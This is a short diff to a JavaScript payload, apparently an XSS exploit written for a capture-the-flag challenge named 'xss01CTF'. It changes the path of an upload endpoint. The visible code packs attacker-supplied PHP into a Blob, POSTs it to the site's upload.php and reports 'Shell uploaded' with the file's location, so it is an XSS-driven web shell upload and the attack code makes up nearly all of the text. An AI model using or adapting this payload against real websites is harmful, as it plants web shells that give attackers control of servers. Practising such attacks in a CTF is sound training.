@@ -16,13 +16,13 @@
         new Blob([code], { type: 'application/x-php' }),
         filename
       );
-      return fetch('/xss01/upload.php', {
+      return fetch('/xss01CTF/upload.php', {
         method: 'POST',
         body: form
       });
     })
     .then(() => {
-      alert('Shell uploaded: /xss01/upload/' + filename);
+      alert('Shell uploaded: /xss01CTF/upload/' + filename);
     });
 
 })();
